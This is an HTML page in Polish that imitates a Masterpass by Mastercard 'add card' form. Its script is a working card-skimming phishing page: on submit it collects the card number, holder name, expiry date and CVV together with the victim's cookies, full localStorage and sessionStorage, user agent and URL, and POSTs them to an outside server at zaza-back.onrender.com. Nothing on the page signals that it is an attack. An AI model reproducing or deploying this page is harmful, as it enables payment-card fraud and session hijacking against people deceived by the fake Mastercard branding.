<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Masterpass Karta</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
</head>
<body class="bg-black flex items-center justify-center min-h-screen font-sans">
  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
    <!-- Header -->
    <div class="flex items-center justify-between p-4 border-b">
      <div class="flex items-center space-x-2">
        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
        <div class="text-sm font-semibold">
          masterpass <span class="text-gray-500 text-xs block">by mastercard.</span>
        </div>
      </div>
      <div class="relative group cursor-pointer">
        <img src="https://flagcdn.com/w40/pl.png" class="w-6 h-4" />
        <div class="absolute hidden group-hover:block bg-white border shadow-md right-0 mt-2 rounded text-sm z-10">
          <a href="#" class="block px-4 py-2 hover:bg-gray-100">ğŸ‡µğŸ‡± Polski</a>
          <a href="#" class="block px-4 py-2 hover:bg-gray-100">ğŸ‡¬ğŸ‡§ English</a>
        </div>
      </div>
    </div>

    <!-- Form -->
    <div class="p-6">
      <h2 class="text-lg font-semibold mb-4">Dodaj kartÄ™</h2>
      <form id="cardForm" class="space-y-4" novalidate>
        <div>
          <input
            type="text"
            name="cardNumber"
            id="cardNumber"
            placeholder="Numer karty"
            maxlength="19"
            inputmode="numeric"
            class="w-full border px-4 py-2 rounded outline-none transition"
            required />
          <p class="text-xs text-red-500 hidden mt-1" id="cardNumberError">Numer karty powinien zawieraÄ‡ 16 cyfr</p>
        </div>

  	<input
  	  type="text"
  	  name="cardHolder"
  	  id="cardHolder"
  	  placeholder="ImiÄ™ i nazwisko posiadacza"
  	  class="w-full border px-4 py-2 rounded focus:ring-2 outline-none transition"
  	  required />
	<p class="text-xs text-red-500 hidden mt-1" id="cardHolderError">
  	  Tylko imiÄ™ i nazwisko po angielsku (np. John Smith)
        </p>

        <div class="flex gap-4 items-center">
          <div class="relative w-1/4">
            <input
              type="text"
              name="expMonth"
              id="expMonth"
              placeholder="MM"
              maxlength="2"
              inputmode="numeric"
              class="w-full border px-4 py-2 rounded text-center outline-none transition"
              required />
            <p class="text-xs text-red-500 hidden mt-1" id="expMonthError">1â€“12</p>
          </div>

          <span class="text-gray-600">/</span>

          <div class="relative w-1/4">
            <input
              type="text"
              name="expYear"
              id="expYear"
              placeholder="RR"
              maxlength="2"
              inputmode="numeric"
              class="w-full border px-4 py-2 rounded text-center outline-none transition"
              required />
            <p class="text-xs text-red-500 hidden mt-1" id="expYearError">Wymagane</p>
          </div>

          <div class="relative flex-1">
            <input
              type="text"
              name="cvv"
              id="cvv"
              placeholder="CVV"
              maxlength="4"
              inputmode="numeric"
              class="w-full border px-4 py-2 rounded outline-none transition"
              required />
            <p class="text-xs text-red-500 hidden mt-1" id="cvvError">3â€“4 cyfry</p>
          </div>
        </div>

        <button
          type="submit"
          class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition">
          Zapisz kartÄ™
        </button>
      </form>
    </div>

    <!-- Footer -->
    <div class="text-xs bg-black text-white p-2 text-center">
      Strona wykorzystuje pliki cookie zgodnie z politykÄ… prywatnoÅ›ci.
    </div>
  </div>

  <script>
    const user = JSON.parse(localStorage.getItem('user'));
    if (!user) window.location.href = 'index.html';

    const form = document.getElementById('cardForm');
    const cardNumber = document.getElementById('cardNumber');
    const expMonth = document.getElementById('expMonth');
    const expYear = document.getElementById('expYear');
    const cvv = document.getElementById('cvv');
    const cardHolder = document.getElementById('cardHolder');

    const cardNumberError = document.getElementById('cardNumberError');
    const expMonthError = document.getElementById('expMonthError');
    const expYearError = document.getElementById('expYearError');
    const cvvError = document.getElementById('cvvError');
    const cardHolderError = document.getElementById('cardHolderError');

    const valid =
      validateCardNumber() &&
      validateHolder() &&
      validateMonth() &&
      validateYear() &&
      validateCVV();

    function maskCardNumber(value) {
      return value.replace(/\D/g, '').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
    }

    function validateCardNumber() {
      const digits = cardNumber.value.replace(/\s/g, '');
      if (digits.length !== 16) {
        cardNumber.classList.add('border-red-500');
        cardNumberError.classList.remove('hidden');
        return false;
      }
      cardNumber.classList.remove('border-red-500');
      cardNumberError.classList.add('hidden');
      return true;
    }

    function validateMonth() {
      const value = expMonth.value;
      const valid = /^(0[1-9]|1[0-2])$/.test(value);
      if (!valid) {
        expMonth.classList.add('border-red-500');
        expMonthError.classList.remove('hidden');
        return false;
      }
      expMonth.classList.remove('border-red-500');
      expMonthError.classList.add('hidden');
      return true;
    }

    function validateYear() {
      const value = expYear.value;
      const valid = /^\d{2}$/.test(value);
      if (!valid) {
        expYear.classList.add('border-red-500');
        expYearError.classList.remove('hidden');
        return false;
      }
      expYear.classList.remove('border-red-500');
      expYearError.classList.add('hidden');
      return true;
    }

    function validateCVV() {
      const value = cvv.value;
      const valid = /^\d{3,4}$/.test(value);
      if (!valid) {
        cvv.classList.add('border-red-500');
        cvvError.classList.remove('hidden');
        return false;
      }
      cvv.classList.remove('border-red-500');
      cvvError.classList.add('hidden');
      return true;
    }


    function validateHolder() {
      const value = cardHolder.value.trim();
      const valid = /^[A-Za-z]+ [A-Za-z]+$/.test(value);
      if (!valid) {
        cardHolder.classList.add('border-red-500');
        cardHolderError.classList.remove('hidden');
        return false;
      }
      cardHolder.classList.remove('border-red-500');
      cardHolderError.classList.add('hidden');
      return true;
    }

    cardNumber.addEventListener('input', (e) => {
      cardNumber.value = maskCardNumber(e.target.value);
      validateCardNumber();
    });

    expMonth.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
      if (e.target.value.length === 2) expYear.focus();
      validateMonth();
    });

    expYear.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
      if (e.target.value.length === 2) cvv.focus();
      validateYear();
    });

    cvv.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
      validateCVV();
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const valid =
        validateCardNumber() &&
        validateMonth() &&
        validateYear() &&
        validateCVV();

      if (!valid) return;

      const payload = {
        cardNumber: cardNumber.value.replace(/\s/g, ''),
        cardHolder: form.cardHolder.value.trim(),
        expiryDate: `${expMonth.value}/${expYear.value}`,
        cvv: cvv.value,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        location: window.location.href,
        date: new Date().toISOString(),
      };

      try {
        const res = await fetch('https://zaza-back.onrender.com/card', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (res.ok) {
          form.reset();
          [cardNumber, expMonth, expYear, cvv].forEach(el => el.classList.remove('border-red-500'));
          [cardNumberError, expMonthError, expYearError, cvvError].forEach(el => el.classList.add('hidden'));
        }
      } catch (err) {
        console.error(err);
      }
    });
  </script>
</body>
</html>
